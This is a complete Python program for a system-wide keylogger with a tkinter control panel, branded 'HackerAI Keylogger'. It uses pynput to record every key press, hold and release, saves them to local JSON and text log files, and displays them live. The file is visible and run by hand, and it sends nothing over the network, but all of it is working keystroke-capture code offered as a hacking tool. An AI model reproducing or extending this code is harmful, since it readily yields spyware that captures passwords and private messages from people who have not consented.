from pynput import keyboard
import json
import time
import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import os

key_list = []
x = False
key_strokes = ""
listener = None
is_running = False

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=2)

def update_txt_file(key_list):
    with open('logs.txt', 'w') as txt_log:
        for event in key_list:
            for action, key in event.items():
                key_str = str(key).replace("'", "")
                if key_str.startswith('Key.'):
                    txt_log.write(f"[{action}] {key_str}\n")
                else:
                    txt_log.write(f"[{action}] '{key_str}'\n")

def on_press(key):
    global x, key_list, is_running
    if not is_running:
        return
    
    try:
        key_str = str(key).replace("'", "")
    except:
        key_str = str(key)
        
    if x == False:
        key_list.append({'Pressed': key_str})
        x = True
    else:
        key_list.append({'Held': key_str})
    
    update_json_file(key_list)
    update_txt_file(key_list)
    update_gui(key_str, "Pressed" if not x else "Held")

def on_release(key):
    global x, key_list, is_running
    if not is_running:
        return
    
    try:
        key_str = str(key).replace("'", "")
    except:
        key_str = str(key)
        
    key_list.append({'Released': key_str})
    if x == True:
        x = False
    
    update_json_file(key_list)
    update_txt_file(key_list)
    update_gui(key_str, "Released")

def update_gui(key_str, action):
    # Update live log display
    timestamp = time.strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] [{action}] {key_str}"
    
    def _update():
        log_text.insert(tk.END, log_entry + "\n")
        log_text.see(tk.END)
        status_label.config(text=f"Keys logged: {len(key_list)} | Status: ACTIVE")
    
    gui_root.after(0, _update)  # Thread-safe GUI update

def start_keylogger():
    global listener, is_running
    if not is_running:
        is_running = True
        start_button.config(state="disabled")
        stop_button.config(state="normal")
        clear_button.config(state="disabled")
        
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.daemon = True
        listener.start()
        
        status_label.config(text="Status: ACTIVE | Keys logged: 0")
        log_text.insert(tk.END, "[+] Keylogger STARTED\n")

def stop_keylogger():
    global listener, is_running
    if is_running:
        is_running = False
        start_button.config(state="normal")
        stop_button.config(state="disabled")
        clear_button.config(state="normal")
        
        if listener:
            listener.stop()
        
        status_label.config(text=f"Status: STOPPED | Total keys logged: {len(key_list)}")
        log_text.insert(tk.END, "[+] Keylogger STOPPED\n")

def clear_logs():
    global key_list
    key_list.clear()
    log_text.delete(1.0, tk.END)
    status_label.config(text="Status: READY | Keys logged: 0")
    
    # Clear files
    if os.path.exists('logs.json'):
        os.remove('logs.json')
    if os.path.exists('logs.txt'):
        os.remove('logs.txt')

def on_closing():
    global is_running
    is_running = False
    if listener:
        listener.stop()
    gui_root.destroy()

# GUI Setup
gui_root = tk.Tk()
gui_root.title("HackerAI Keylogger")
gui_root.geometry("600x500")
gui_root.protocol("WM_DELETE_WINDOW", on_closing)

# Title
title_label = tk.Label(gui_root, text="Keylogger Control Panel", font=("Arial", 14, "bold"))
title_label.pack(pady=10)

# Control frame
control_frame = tk.Frame(gui_root)
control_frame.pack(pady=10)

start_button = tk.Button(control_frame, text="START", command=start_keylogger, 
                        bg="green", fg="white", font=("Arial", 10, "bold"), width=12)
start_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(control_frame, text="STOP", command=stop_keylogger, 
                       bg="red", fg="white", font=("Arial", 10, "bold"), width=12, state="disabled")
stop_button.pack(side=tk.LEFT, padx=5)

clear_button = tk.Button(control_frame, text="CLEAR LOGS", command=clear_logs,
                        bg="orange", fg="white", font=("Arial", 10, "bold"), width=12)
clear_button.pack(side=tk.LEFT, padx=5)

# Status label
status_label = tk.Label(gui_root, text="Status: READY | Keys logged: 0", 
                       font=("Arial", 10), fg="blue")
status_label.pack(pady=5)

# Log display
log_frame = tk.Frame(gui_root)
log_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

log_text = scrolledtext.ScrolledText(log_frame, height=20, width=70, 
                                   font=("Consolas", 9), bg="#1e1e1e", fg="#00ff00")
log_text.pack(fill=tk.BOTH, expand=True)

# Info label
info_label = tk.Label(gui_root, text="Files: logs.json (JSON) & logs.txt (Plain Text) | Ctrl+C also stops",
                     font=("Arial", 8), fg="gray")
info_label.pack(pady=5)

# Start GUI
print("[+] Keylogger GUI launched!")
gui_root.mainloop()

